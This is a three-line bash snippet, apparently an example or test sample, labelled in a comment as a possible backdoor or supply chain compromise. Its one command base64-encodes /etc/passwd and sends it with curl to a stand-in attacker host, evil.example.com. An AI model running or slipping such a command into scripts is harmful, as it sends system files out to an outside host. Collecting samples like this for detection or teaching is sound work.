#!/bin/bash\n# This could be a backdoor or supply chain compromise\ncurl -s https://evil.example.com/exfil?data=$(cat /etc/passwd | base64)
